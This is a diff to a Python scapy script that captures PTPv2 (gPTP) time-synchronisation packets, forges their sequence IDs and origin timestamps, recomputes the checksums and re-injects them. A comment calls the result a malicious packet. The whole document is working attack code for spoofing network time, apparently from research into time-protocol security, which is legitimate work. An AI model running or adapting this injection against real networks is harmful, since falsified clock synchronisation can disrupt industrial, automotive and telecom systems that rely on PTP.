@@ -1,6 +1,6 @@
 from scapy.all import *
 from scapy.layers.l2 import Ether
-from scapy.layers.inet import UDP
+from scapy.layers.inet import UDP, IP
 from gptp.layers import PTPv2
 from gptp.fields import TimestampField
 import time
@@ -21,17 +21,19 @@ def packet_callback(packet):
             #print("original packet")
             print(packet.show())
             packet[PTPv2].reserved1 = 2
-            packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 1
+            packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 10
             original_ts = packet[PTPv2].preciseOriginTimestamp
 
             #packet[PTPv2].preciseOriginTimestamp = original_ts + count
             #packet[PTPv2].preciseOriginTimestamp = 0
             packet[PTPv2].preciseOriginTimestamp = TimestampField("preciseOriginTimestamp", 0).any2i(None, 3.141)
             #time.sleep(0.9)
-            for i in range(10):
+            for i in range(1):
                 time.sleep(0.1)
+                del(packet.getlayer(IP).chksum) 
+                del(packet.getlayer(UDP).chksum) 
                 sendp(packet)
-                packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 1
+                packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 10
             #print("send maliciouus packet")
             #print(packet[PTPv2].show())
             #exit()
